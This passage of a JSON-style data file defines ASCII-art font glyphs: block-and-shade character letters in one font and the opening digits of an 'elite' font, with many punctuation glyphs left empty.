          "",
          ""
        ],
        " ": [
          "$ $",
          "$ $",
          "$ $",
          "$ $",
          "$ $",
          "$ $",
          "$ $",
          "$ $",
          "$ $",
          "$ $"
        ],
        "!": [
          "$\u2590\u2588\u2588\u258C$",
          "$\u2590\u2588\u2588\u258C$",
          "$\u2590\u2588\u2588\u258C$",
          "$\u2593\u2588\u2588\u2592$",
          "$\u2592\u2584\u2584 $",
          "$\u2591\u2580\u2580\u2592$",
          "$\u2591  \u2591$",
          "$   \u2591$",
          "$\u2591   $",
          "$    $"
        ],
        '"': [
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          ""
        ],
        "#": [
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          ""
        ],
        "$": [
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          ""
        ],
        "%": [
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          ""
        ],
        "&": [
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          ""
        ],
        "'": [
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          ""
        ],
        "(": [
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          ""
        ],
        ")": [
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          ""
        ],
        "*": [
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          ""
        ],
        "+": [
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          ""
        ],
        ",": [
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          ""
        ],
        "-": [
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          ""
        ],
        ".": [
          "$   $",
          "$   $",
          "$   $",
          "$   $",
          "$\u2588\u2588\u2593$",
          "$\u2592\u2593\u2592$",
          "$\u2591\u2592 $",
          "$\u2591  $",
          "$ \u2591 $",
          "$ \u2591 $"
        ],
        "/": [
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          ""
        ],
        ":": [
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          ""
        ],
        ";": [
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          ""
        ],
        "<": [
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          ""
        ],
        "=": [
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          ""
        ],
        ">": [
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          ""
        ],
        "?": [
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          ""
        ],
        "@": [
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          ""
        ],
        "A": [
          " \u2584\u2584\u2584      ",
          "\u2592\u2588\u2588\u2588\u2588\u2584    ",
          "\u2592\u2588\u2588  \u2580\u2588\u2584  ",
          "\u2591\u2588\u2588\u2584\u2584\u2584\u2584\u2588\u2588 ",
          " \u2593\u2588   \u2593\u2588\u2588\u2592",
          " \u2592\u2592   \u2593\u2592\u2588\u2591",
          "  \u2592   \u2592\u2592 \u2591",
          "  \u2591   \u2592   ",
          "      \u2591  \u2591",
          "          "
        ],
        "B": [
          " \u2584\u2584\u2584\u2584   ",
          "\u2593\u2588\u2588\u2588\u2588\u2588\u2584 ",
          "\u2592\u2588\u2588\u2592 \u2584\u2588\u2588",
          "\u2592\u2588\u2588\u2591\u2588\u2580  ",
          "\u2591\u2593\u2588  \u2580\u2588\u2593",
          "\u2591\u2592\u2593\u2588\u2588\u2588\u2580\u2592",
          "\u2592\u2591\u2592   \u2591 ",
          " \u2591    \u2591 ",
          " \u2591      ",
          "      \u2591 "
        ],
        "C": [
          " \u2584\u2588\u2588\u2588\u2588\u2584  ",
          "\u2592\u2588\u2588\u2580 \u2580\u2588  ",
          "\u2592\u2593\u2588    \u2584 ",
          "\u2592\u2593\u2593\u2584 \u2584\u2588\u2588\u2592",
          "\u2592 \u2593\u2588\u2588\u2588\u2580 \u2591",
          "\u2591 \u2591\u2592 \u2592  \u2591",
          "  \u2591  \u2592   ",
          "\u2591        ",
          "\u2591 \u2591      ",
          "\u2591        "
        ],
        "D": [
          "\u2593\u2588\u2588\u2588\u2588\u2588\u2584 ",
          "\u2592\u2588\u2588\u2580 \u2588\u2588\u258C",
          "\u2591\u2588\u2588   \u2588\u258C",
          "\u2591\u2593\u2588\u2584   \u258C",
          "\u2591\u2592\u2588\u2588\u2588\u2588\u2593 ",
          " \u2592\u2592\u2593  \u2592 ",
          " \u2591 \u2592  \u2592 ",
          " \u2591 \u2591  \u2591 ",
          "   \u2591    ",
          " \u2591      "
        ],
        "E": [
          "\u2593\u2588\u2588\u2588\u2588\u2588 ",
          "\u2593\u2588   \u2580 ",
          "\u2592\u2588\u2588\u2588   ",
          "\u2592\u2593\u2588  \u2584 ",
          "\u2591\u2592\u2588\u2588\u2588\u2588\u2592",
          "\u2591\u2591 \u2592\u2591 \u2591",
          " \u2591 \u2591  \u2591",
          "   \u2591   ",
          "   \u2591  \u2591",
          "       "
        ],
        "F": [
          "  \u2588\u2588\u2588\u2588\u2588\u2592",
          "\u2593\u2588\u2588   \u2592 ",
          "\u2592\u2588\u2588\u2588\u2588 \u2591 ",
          "\u2591\u2593\u2588\u2592  \u2591 ",
          "\u2591\u2592\u2588\u2591    ",
          " \u2592 \u2591    ",
          " \u2591      ",
          " \u2591 \u2591    ",
          "        ",
          "        "
        ],
        "G": [
          "  \u2584\u2588\u2588\u2588\u2588 ",
          " \u2588\u2588\u2592 \u2580\u2588\u2592",
          "\u2592\u2588\u2588\u2591\u2584\u2584\u2584\u2591",
          "\u2591\u2593\u2588  \u2588\u2588\u2593",
          "\u2591\u2592\u2593\u2588\u2588\u2588\u2580\u2592",
          " \u2591\u2592   \u2592 ",
          "  \u2591   \u2591 ",
          "\u2591 \u2591   \u2591 ",
          "      \u2591 ",
          "        "
        ],
        "H": [
          " \u2588\u2588\u2591 \u2588\u2588 ",
          "\u2593\u2588\u2588\u2591 \u2588\u2588\u2592",
          "\u2592\u2588\u2588\u2580\u2580\u2588\u2588\u2591",
          "\u2591\u2593\u2588 \u2591\u2588\u2588 ",
          "\u2591\u2593\u2588\u2592\u2591\u2588\u2588\u2593",
          " \u2592 \u2591\u2591\u2592\u2591\u2592",
          " \u2592 \u2591\u2592\u2591 \u2591",
          " \u2591  \u2591\u2591 \u2591",
          " \u2591  \u2591  \u2591",
          "        "
        ],
        "I": [
          " \u2588\u2588\u2593",
          "\u2593\u2588\u2588\u2592",
          "\u2592\u2588\u2588\u2592",
          "\u2591\u2588\u2588\u2591",
          "\u2591\u2588\u2588\u2591",
          "\u2591\u2593  ",
          " \u2592 \u2591",
          " \u2592 \u2591",
          " \u2591  ",
          "    "
        ],
        "J": [
          " \u2584\u2584\u2584\u2588\u2588\u2580\u2580\u2580",
          "   \u2592\u2588\u2588   ",
          "   \u2591\u2588\u2588   ",
          "\u2593\u2588\u2588\u2584\u2588\u2588\u2593  ",
          " \u2593\u2588\u2588\u2588\u2592   ",
          " \u2592\u2593\u2592\u2592\u2591   ",
          " \u2592 \u2591\u2592\u2591   ",
          " \u2591 \u2591 \u2591   ",
          " \u2591   \u2591   ",
          "         "
        ],
        "K": [
          " \u2588\u2588 \u2584\u2588\u2580",
          " \u2588\u2588\u2584\u2588\u2592 ",
          "\u2593\u2588\u2588\u2588\u2584\u2591 ",
          "\u2593\u2588\u2588 \u2588\u2584 ",
          "\u2592\u2588\u2588\u2592 \u2588\u2584",
          "\u2592 \u2592\u2592 \u2593\u2592",
          "\u2591 \u2591\u2592 \u2592\u2591",
          "\u2591 \u2591\u2591 \u2591 ",
          "\u2591  \u2591   ",
          "       "
        ],
        "L": [
          " \u2588\u2588\u2593    ",
          "\u2593\u2588\u2588\u2592    ",
          "\u2592\u2588\u2588\u2591    ",
          "\u2592\u2588\u2588\u2591    ",
          "\u2591\u2588\u2588\u2588\u2588\u2588\u2588\u2592",
          "\u2591 \u2592\u2591\u2593  \u2591",
          "\u2591 \u2591 \u2592  \u2591",
          "  \u2591 \u2591   ",
          "    \u2591  \u2591",
          "        "
        ],
        "M": [
          " \u2588\u2588\u2588\u2584 \u2584\u2588\u2588\u2588\u2593",
          "\u2593\u2588\u2588\u2592\u2580\u2588\u2580 \u2588\u2588\u2592",
          "\u2593\u2588\u2588    \u2593\u2588\u2588\u2591",
          "\u2592\u2588\u2588    \u2592\u2588\u2588 ",
          "\u2592\u2588\u2588\u2592   \u2591\u2588\u2588\u2592",
          "\u2591 \u2592\u2591   \u2591  \u2591",
          "\u2591  \u2591      \u2591",
          "\u2591      \u2591   ",
          "       \u2591   ",
          "           "
        ],
        "N": [
          " \u2588\u2588\u2588\u2584    \u2588 ",
          " \u2588\u2588 \u2580\u2588   \u2588 ",
          "\u2593\u2588\u2588  \u2580\u2588 \u2588\u2588\u2592",
          "\u2593\u2588\u2588\u2592  \u2590\u258C\u2588\u2588\u2592",
          "\u2592\u2588\u2588\u2591   \u2593\u2588\u2588\u2591",
          "\u2591 \u2592\u2591   \u2592 \u2592 ",
          "\u2591 \u2591\u2591   \u2591 \u2592\u2591",
          "   \u2591   \u2591 \u2591 ",
          "         \u2591 ",
          "           "
        ],
        "O": [
          " \u2592\u2588\u2588\u2588\u2588\u2588  ",
          "\u2592\u2588\u2588\u2592  \u2588\u2588\u2592",
          "\u2592\u2588\u2588\u2591  \u2588\u2588\u2592",
          "\u2592\u2588\u2588   \u2588\u2588\u2591",
          "\u2591 \u2588\u2588\u2588\u2588\u2593\u2592\u2591",
          "\u2591 \u2592\u2591\u2592\u2591\u2592\u2591 ",
          "  \u2591 \u2592 \u2592\u2591 ",
          "\u2591 \u2591 \u2591 \u2592  ",
          "    \u2591 \u2591  ",
          "         "
        ],
        "P": [
          " \u2588\u2588\u2593\u2588\u2588\u2588  ",
          "\u2593\u2588\u2588\u2591  \u2588\u2588\u2592",
          "\u2593\u2588\u2588\u2591 \u2588\u2588\u2593\u2592",
          "\u2592\u2588\u2588\u2584\u2588\u2593\u2592 \u2592",
          "\u2592\u2588\u2588\u2592 \u2591  \u2591",
          "\u2592\u2593\u2592\u2591 \u2591  \u2591",
          "\u2591\u2592 \u2591     ",
          "\u2591\u2591       ",
          "         ",
          "         "
        ],
        "Q": [
          "  \u2588\u2588\u2588\u2588\u2588  ",
          "\u2592\u2588\u2588\u2593  \u2588\u2588\u2592",
          "\u2592\u2588\u2588\u2592  \u2588\u2588\u2591",
          "\u2591\u2588\u2588  \u2588\u2580 \u2591",
          "\u2591\u2592\u2588\u2588\u2588\u2592\u2588\u2584 ",
          "\u2591\u2591 \u2592\u2592\u2591 \u2592 ",
          " \u2591 \u2592\u2591  \u2591 ",
          "   \u2591   \u2591 ",
          "    \u2591    ",
          "         "
        ],
        "R": [
          " \u2588\u2588\u2580\u2588\u2588\u2588  ",
          "\u2593\u2588\u2588 \u2592 \u2588\u2588\u2592",
          "\u2593\u2588\u2588 \u2591\u2584\u2588 \u2592",
          "\u2592\u2588\u2588\u2580\u2580\u2588\u2584  ",
          "\u2591\u2588\u2588\u2593 \u2592\u2588\u2588\u2592",
          "\u2591 \u2592\u2593 \u2591\u2592\u2593\u2591",
          "  \u2591\u2592 \u2591 \u2592\u2591",
          "  \u2591\u2591   \u2591 ",
          "   \u2591     ",
          "         "
        ],
        "S": [
          "  \u2588\u2588\u2588\u2588\u2588\u2588 ",
          "\u2592\u2588\u2588    \u2592 ",
          "\u2591 \u2593\u2588\u2588\u2584   ",
          "  \u2592   \u2588\u2588\u2592",
          "\u2592\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592",
          "\u2592 \u2592\u2593\u2592 \u2592 \u2591",
          "\u2591 \u2591\u2592  \u2591 \u2591",
          "\u2591  \u2591  \u2591  ",
          "      \u2591  ",
          "         "
        ],
        "T": [
          "\u2584\u2584\u2584\u2588\u2588\u2588\u2588\u2588\u2593",
          "\u2593  \u2588\u2588\u2592 \u2593\u2592",
          "\u2592 \u2593\u2588\u2588\u2591 \u2592\u2591",
          "\u2591 \u2593\u2588\u2588\u2593 \u2591 ",
          "  \u2592\u2588\u2588\u2592 \u2591 ",
          "  \u2592 \u2591\u2591   ",
          "    \u2591    ",
          "  \u2591      ",
          "         ",
          "         "
        ],
        "U": [
          " \u2588    \u2588\u2588 ",
          " \u2588\u2588  \u2593\u2588\u2588\u2592",
          "\u2593\u2588\u2588  \u2592\u2588\u2588\u2591",
          "\u2593\u2593\u2588  \u2591\u2588\u2588\u2591",
          "\u2592\u2592\u2588\u2588\u2588\u2588\u2588\u2593 ",
          "\u2591\u2592\u2593\u2592 \u2592 \u2592 ",
          "\u2591\u2591\u2592\u2591 \u2591 \u2591 ",
          " \u2591\u2591\u2591 \u2591 \u2591 ",
          "   \u2591     ",
          "         "
        ],
        "V": [
          " \u2588\u2588\u2592   \u2588\u2593",
          "\u2593\u2588\u2588\u2591   \u2588\u2592",
          " \u2593\u2588\u2588  \u2588\u2592\u2591",
          "  \u2592\u2588\u2588 \u2588\u2591\u2591",
          "   \u2592\u2580\u2588\u2591  ",
          "   \u2591 \u2590\u2591  ",
          "   \u2591 \u2591\u2591  ",
          "     \u2591\u2591  ",
          "      \u2591  ",
          "     \u2591   "
        ],
        "W": [
          " \u2588     \u2588\u2591",
          "\u2593\u2588\u2591 \u2588 \u2591\u2588\u2591",
          "\u2592\u2588\u2591 \u2588 \u2591\u2588 ",
          "\u2591\u2588\u2591 \u2588 \u2591\u2588 ",
          "\u2591\u2591\u2588\u2588\u2592\u2588\u2588\u2593 ",
          "\u2591 \u2593\u2591\u2592 \u2592  ",
          "  \u2592 \u2591 \u2591  ",
          "  \u2591   \u2591  ",
          "    \u2591    ",
          "         "
        ],
        "X": [
          "\u2592\u2588\u2588   \u2588\u2588\u2592",
          "\u2592\u2592 \u2588 \u2588 \u2592\u2591",
          "\u2591\u2591  \u2588   \u2591",
          " \u2591 \u2588 \u2588 \u2592 ",
          "\u2592\u2588\u2588\u2592 \u2592\u2588\u2588\u2592",
          "\u2592\u2592 \u2591 \u2591\u2593 \u2591",
          "\u2591\u2591   \u2591\u2592 \u2591",
          " \u2591    \u2591  ",
          " \u2591    \u2591  ",
          "         "
        ],
        "Y": [
          "\u2593\u2588\u2588   \u2588\u2588\u2593",
          " \u2592\u2588\u2588  \u2588\u2588\u2592",
          "  \u2592\u2588\u2588 \u2588\u2588\u2591",
          "  \u2591 \u2590\u2588\u2588\u2593\u2591",
          "  \u2591 \u2588\u2588\u2592\u2593\u2591",
          "   \u2588\u2588\u2592\u2592\u2592 ",
          " \u2593\u2588\u2588 \u2591\u2592\u2591 ",
          " \u2592 \u2592 \u2591\u2591  ",
          " \u2591 \u2591     ",
          " \u2591 \u2591     "
        ],
        "Z": [
          "\u2592\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2592",
          "\u2592 \u2592 \u2592 \u2584\u2580\u2591",
          "\u2591 \u2592 \u2584\u2580\u2592\u2591 ",
          "  \u2584\u2580\u2592   \u2591",
          "\u2592\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2592",
          "\u2591\u2592\u2592 \u2593\u2591\u2592\u2591\u2592",
          "\u2591\u2591\u2592 \u2592 \u2591 \u2592",
          "\u2591 \u2591 \u2591 \u2591 \u2591",
          "  \u2591 \u2591    ",
          "\u2591        "
        ],
        "[": [
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          ""
        ],
        "\\": [
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          ""
        ],
        "]": [
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          ""
        ],
        "^": [
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          ""
        ],
        "_": [
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          ""
        ],
        "`": [
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          ""
        ],
        "a": [
          " \u2584\u2584\u2584      ",
          "\u2592\u2588\u2588\u2588\u2588\u2584    ",
          "\u2592\u2588\u2588  \u2580\u2588\u2584  ",
          "\u2591\u2588\u2588\u2584\u2584\u2584\u2584\u2588\u2588 ",
          " \u2593\u2588   \u2593\u2588\u2588\u2592",
          " \u2592\u2592   \u2593\u2592\u2588\u2591",
          "  \u2592   \u2592\u2592 \u2591",
          "  \u2591   \u2592   ",
          "      \u2591  \u2591",
          "          "
        ],
        "b": [
          " \u2584\u2584\u2584\u2584   ",
          "\u2593\u2588\u2588\u2588\u2588\u2588\u2584 ",
          "\u2592\u2588\u2588\u2592 \u2584\u2588\u2588",
          "\u2592\u2588\u2588\u2591\u2588\u2580  ",
          "\u2591\u2593\u2588  \u2580\u2588\u2593",
          "\u2591\u2592\u2593\u2588\u2588\u2588\u2580\u2592",
          "\u2592\u2591\u2592   \u2591 ",
          " \u2591    \u2591 ",
          " \u2591      ",
          "      \u2591 "
        ],
        "c": [
          " \u2584\u2588\u2588\u2588\u2588\u2584  ",
          "\u2592\u2588\u2588\u2580 \u2580\u2588  ",
          "\u2592\u2593\u2588    \u2584 ",
          "\u2592\u2593\u2593\u2584 \u2584\u2588\u2588\u2592",
          "\u2592 \u2593\u2588\u2588\u2588\u2580 \u2591",
          "\u2591 \u2591\u2592 \u2592  \u2591",
          "  \u2591  \u2592   ",
          "\u2591        ",
          "\u2591 \u2591      ",
          "\u2591        "
        ],
        "d": [
          "\u2593\u2588\u2588\u2588\u2588\u2588\u2584 ",
          "\u2592\u2588\u2588\u2580 \u2588\u2588\u258C",
          "\u2591\u2588\u2588   \u2588\u258C",
          "\u2591\u2593\u2588\u2584   \u258C",
          "\u2591\u2592\u2588\u2588\u2588\u2588\u2593 ",
          " \u2592\u2592\u2593  \u2592 ",
          " \u2591 \u2592  \u2592 ",
          " \u2591 \u2591  \u2591 ",
          "   \u2591    ",
          " \u2591      "
        ],
        "e": [
          "\u2593\u2588\u2588\u2588\u2588\u2588 ",
          "\u2593\u2588   \u2580 ",
          "\u2592\u2588\u2588\u2588   ",
          "\u2592\u2593\u2588  \u2584 ",
          "\u2591\u2592\u2588\u2588\u2588\u2588\u2592",
          "\u2591\u2591 \u2592\u2591 \u2591",
          " \u2591 \u2591  \u2591",
          "   \u2591   ",
          "   \u2591  \u2591",
          "       "
        ],
        "f": [
          "  \u2588\u2588\u2588\u2588\u2588\u2592",
          "\u2593\u2588\u2588   \u2592 ",
          "\u2592\u2588\u2588\u2588\u2588 \u2591 ",
          "\u2591\u2593\u2588\u2592  \u2591 ",
          "\u2591\u2592\u2588\u2591    ",
          " \u2592 \u2591    ",
          " \u2591      ",
          " \u2591 \u2591    ",
          "        ",
          "        "
        ],
        "g": [
          "  \u2584\u2588\u2588\u2588\u2588 ",
          " \u2588\u2588\u2592 \u2580\u2588\u2592",
          "\u2592\u2588\u2588\u2591\u2584\u2584\u2584\u2591",
          "\u2591\u2593\u2588  \u2588\u2588\u2593",
          "\u2591\u2592\u2593\u2588\u2588\u2588\u2580\u2592",
          " \u2591\u2592   \u2592 ",
          "  \u2591   \u2591 ",
          "\u2591 \u2591   \u2591 ",
          "      \u2591 ",
          "        "
        ],
        "h": [
          " \u2588\u2588\u2591 \u2588\u2588 ",
          "\u2593\u2588\u2588\u2591 \u2588\u2588\u2592",
          "\u2592\u2588\u2588\u2580\u2580\u2588\u2588\u2591",
          "\u2591\u2593\u2588 \u2591\u2588\u2588 ",
          "\u2591\u2593\u2588\u2592\u2591\u2588\u2588\u2593",
          " \u2592 \u2591\u2591\u2592\u2591\u2592",
          " \u2592 \u2591\u2592\u2591 \u2591",
          " \u2591  \u2591\u2591 \u2591",
          " \u2591  \u2591  \u2591",
          "        "
        ],
        "i": [
          " \u2588\u2588\u2593",
          "\u2593\u2588\u2588\u2592",
          "\u2592\u2588\u2588\u2592",
          "\u2591\u2588\u2588\u2591",
          "\u2591\u2588\u2588\u2591",
          "\u2591\u2593  ",
          " \u2592 \u2591",
          " \u2592 \u2591",
          " \u2591  ",
          "    "
        ],
        "j": [
          " \u2584\u2584\u2584\u2588\u2588\u2580\u2580\u2580",
          "   \u2592\u2588\u2588   ",
          "   \u2591\u2588\u2588   ",
          "\u2593\u2588\u2588\u2584\u2588\u2588\u2593  ",
          " \u2593\u2588\u2588\u2588\u2592   ",
          " \u2592\u2593\u2592\u2592\u2591   ",
          " \u2592 \u2591\u2592\u2591   ",
          " \u2591 \u2591 \u2591   ",
          " \u2591   \u2591   ",
          "         "
        ],
        "k": [
          " \u2588\u2588 \u2584\u2588\u2580",
          " \u2588\u2588\u2584\u2588\u2592 ",
          "\u2593\u2588\u2588\u2588\u2584\u2591 ",
          "\u2593\u2588\u2588 \u2588\u2584 ",
          "\u2592\u2588\u2588\u2592 \u2588\u2584",
          "\u2592 \u2592\u2592 \u2593\u2592",
          "\u2591 \u2591\u2592 \u2592\u2591",
          "\u2591 \u2591\u2591 \u2591 ",
          "\u2591  \u2591   ",
          "       "
        ],
        "l": [
          " \u2588\u2588\u2593    ",
          "\u2593\u2588\u2588\u2592    ",
          "\u2592\u2588\u2588\u2591    ",
          "\u2592\u2588\u2588\u2591    ",
          "\u2591\u2588\u2588\u2588\u2588\u2588\u2588\u2592",
          "\u2591 \u2592\u2591\u2593  \u2591",
          "\u2591 \u2591 \u2592  \u2591",
          "  \u2591 \u2591   ",
          "    \u2591  \u2591",
          "        "
        ],
        "m": [
          " \u2588\u2588\u2588\u2584 \u2584\u2588\u2588\u2588\u2593",
          "\u2593\u2588\u2588\u2592\u2580\u2588\u2580 \u2588\u2588\u2592",
          "\u2593\u2588\u2588    \u2593\u2588\u2588\u2591",
          "\u2592\u2588\u2588    \u2592\u2588\u2588 ",
          "\u2592\u2588\u2588\u2592   \u2591\u2588\u2588\u2592",
          "\u2591 \u2592\u2591   \u2591  \u2591",
          "\u2591  \u2591      \u2591",
          "\u2591      \u2591   ",
          "       \u2591   ",
          "           "
        ],
        "n": [
          " \u2588\u2588\u2588\u2584    \u2588 ",
          " \u2588\u2588 \u2580\u2588   \u2588 ",
          "\u2593\u2588\u2588  \u2580\u2588 \u2588\u2588\u2592",
          "\u2593\u2588\u2588\u2592  \u2590\u258C\u2588\u2588\u2592",
          "\u2592\u2588\u2588\u2591   \u2593\u2588\u2588\u2591",
          "\u2591 \u2592\u2591   \u2592 \u2592 ",
          "\u2591 \u2591\u2591   \u2591 \u2592\u2591",
          "   \u2591   \u2591 \u2591 ",
          "         \u2591 ",
          "           "
        ],
        "o": [
          " \u2592\u2588\u2588\u2588\u2588\u2588  ",
          "\u2592\u2588\u2588\u2592  \u2588\u2588\u2592",
          "\u2592\u2588\u2588\u2591  \u2588\u2588\u2592",
          "\u2592\u2588\u2588   \u2588\u2588\u2591",
          "\u2591 \u2588\u2588\u2588\u2588\u2593\u2592\u2591",
          "\u2591 \u2592\u2591\u2592\u2591\u2592\u2591 ",
          "  \u2591 \u2592 \u2592\u2591 ",
          "\u2591 \u2591 \u2591 \u2592  ",
          "    \u2591 \u2591  ",
          "         "
        ],
        "p": [
          " \u2588\u2588\u2593\u2588\u2588\u2588  ",
          "\u2593\u2588\u2588\u2591  \u2588\u2588\u2592",
          "\u2593\u2588\u2588\u2591 \u2588\u2588\u2593\u2592",
          "\u2592\u2588\u2588\u2584\u2588\u2593\u2592 \u2592",
          "\u2592\u2588\u2588\u2592 \u2591  \u2591",
          "\u2592\u2593\u2592\u2591 \u2591  \u2591",
          "\u2591\u2592 \u2591     ",
          "\u2591\u2591       ",
          "         ",
          "         "
        ],
        "q": [
          "  \u2588\u2588\u2588\u2588\u2588  ",
          "\u2592\u2588\u2588\u2593  \u2588\u2588\u2592",
          "\u2592\u2588\u2588\u2592  \u2588\u2588\u2591",
          "\u2591\u2588\u2588  \u2588\u2580 \u2591",
          "\u2591\u2592\u2588\u2588\u2588\u2592\u2588\u2584 ",
          "\u2591\u2591 \u2592\u2592\u2591 \u2592 ",
          " \u2591 \u2592\u2591  \u2591 ",
          "   \u2591   \u2591 ",
          "    \u2591    ",
          "         "
        ],
        "r": [
          " \u2588\u2588\u2580\u2588\u2588\u2588  ",
          "\u2593\u2588\u2588 \u2592 \u2588\u2588\u2592",
          "\u2593\u2588\u2588 \u2591\u2584\u2588 \u2592",
          "\u2592\u2588\u2588\u2580\u2580\u2588\u2584  ",
          "\u2591\u2588\u2588\u2593 \u2592\u2588\u2588\u2592",
          "\u2591 \u2592\u2593 \u2591\u2592\u2593\u2591",
          "  \u2591\u2592 \u2591 \u2592\u2591",
          "  \u2591\u2591   \u2591 ",
          "   \u2591     ",
          "         "
        ],
        "s": [
          "  \u2588\u2588\u2588\u2588\u2588\u2588 ",
          "\u2592\u2588\u2588    \u2592 ",
          "\u2591 \u2593\u2588\u2588\u2584   ",
          "  \u2592   \u2588\u2588\u2592",
          "\u2592\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592",
          "\u2592 \u2592\u2593\u2592 \u2592 \u2591",
          "\u2591 \u2591\u2592  \u2591 \u2591",
          "\u2591  \u2591  \u2591  ",
          "      \u2591  ",
          "         "
        ],
        "t": [
          "\u2584\u2584\u2584\u2588\u2588\u2588\u2588\u2588\u2593",
          "\u2593  \u2588\u2588\u2592 \u2593\u2592",
          "\u2592 \u2593\u2588\u2588\u2591 \u2592\u2591",
          "\u2591 \u2593\u2588\u2588\u2593 \u2591 ",
          "  \u2592\u2588\u2588\u2592 \u2591 ",
          "  \u2592 \u2591\u2591   ",
          "    \u2591    ",
          "  \u2591      ",
          "         ",
          "         "
        ],
        "u": [
          " \u2588    \u2588\u2588 ",
          " \u2588\u2588  \u2593\u2588\u2588\u2592",
          "\u2593\u2588\u2588  \u2592\u2588\u2588\u2591",
          "\u2593\u2593\u2588  \u2591\u2588\u2588\u2591",
          "\u2592\u2592\u2588\u2588\u2588\u2588\u2588\u2593 ",
          "\u2591\u2592\u2593\u2592 \u2592 \u2592 ",
          "\u2591\u2591\u2592\u2591 \u2591 \u2591 ",
          " \u2591\u2591\u2591 \u2591 \u2591 ",
          "   \u2591     ",
          "         "
        ],
        "v": [
          " \u2588\u2588\u2592   \u2588\u2593",
          "\u2593\u2588\u2588\u2591   \u2588\u2592",
          " \u2593\u2588\u2588  \u2588\u2592\u2591",
          "  \u2592\u2588\u2588 \u2588\u2591\u2591",
          "   \u2592\u2580\u2588\u2591  ",
          "   \u2591 \u2590\u2591  ",
          "   \u2591 \u2591\u2591  ",
          "     \u2591\u2591  ",
          "      \u2591  ",
          "     \u2591   "
        ],
        "w": [
          " \u2588     \u2588\u2591",
          "\u2593\u2588\u2591 \u2588 \u2591\u2588\u2591",
          "\u2592\u2588\u2591 \u2588 \u2591\u2588 ",
          "\u2591\u2588\u2591 \u2588 \u2591\u2588 ",
          "\u2591\u2591\u2588\u2588\u2592\u2588\u2588\u2593 ",
          "\u2591 \u2593\u2591\u2592 \u2592  ",
          "  \u2592 \u2591 \u2591  ",
          "  \u2591   \u2591  ",
          "    \u2591    ",
          "         "
        ],
        "x": [
          "\u2592\u2588\u2588   \u2588\u2588\u2592",
          "\u2592\u2592 \u2588 \u2588 \u2592\u2591",
          "\u2591\u2591  \u2588   \u2591",
          " \u2591 \u2588 \u2588 \u2592 ",
          "\u2592\u2588\u2588\u2592 \u2592\u2588\u2588\u2592",
          "\u2592\u2592 \u2591 \u2591\u2593 \u2591",
          "\u2591\u2591   \u2591\u2592 \u2591",
          " \u2591    \u2591  ",
          " \u2591    \u2591  ",
          "         "
        ],
        "y": [
          "\u2593\u2588\u2588   \u2588\u2588\u2593",
          " \u2592\u2588\u2588  \u2588\u2588\u2592",
          "  \u2592\u2588\u2588 \u2588\u2588\u2591",
          "  \u2591 \u2590\u2588\u2588\u2593\u2591",
          "  \u2591 \u2588\u2588\u2592\u2593\u2591",
          "   \u2588\u2588\u2592\u2592\u2592 ",
          " \u2593\u2588\u2588 \u2591\u2592\u2591 ",
          " \u2592 \u2592 \u2591\u2591  ",
          " \u2591 \u2591     ",
          " \u2591 \u2591     "
        ],
        "z": [
          "\u2592\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2592",
          "\u2592 \u2592 \u2592 \u2584\u2580\u2591",
          "\u2591 \u2592 \u2584\u2580\u2592\u2591 ",
          "  \u2584\u2580\u2592   \u2591",
          "\u2592\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2592",
          "\u2591\u2592\u2592 \u2593\u2591\u2592\u2591\u2592",
          "\u2591\u2591\u2592 \u2592 \u2591 \u2592",
          "\u2591 \u2591 \u2591 \u2591 \u2591",
          "  \u2591 \u2591    ",
          "\u2591        "
        ],
        "{": [
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          ""
        ],
        "|": [
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          ""
        ],
        "}": [
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          ""
        ],
        "~": [
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          ""
        ]
      },
      "elite": {
        "0": [
          " <> ",
          "/  \\",
          "\\__/",
          "    "
        ],
        "1": [
          " /| ",
          "  | ",
          " _|_",
          "    "
        ],
        "2": [
          " __)",
          "(__ ",
          "(___",
          "    "
        ],
        "3": [
          " __)",
          " __)",
          "(__)",
          "    "
        ],
        "4": [
          "|__|",
          "   |",
          "   |",
          "    "
        ],
        "5": [
          "|__ ",
          "   )",
          "(__/",
          "    "
        ],
        "6": [
          " /_ ",
          "|_ )",
          "|__/",
          "    "
        ],
        "7": [
          "~~/ ",
          " /  ",
          "/   ",
          "    "
        ],
        "8": [
          "(~~)",
          "(__)",
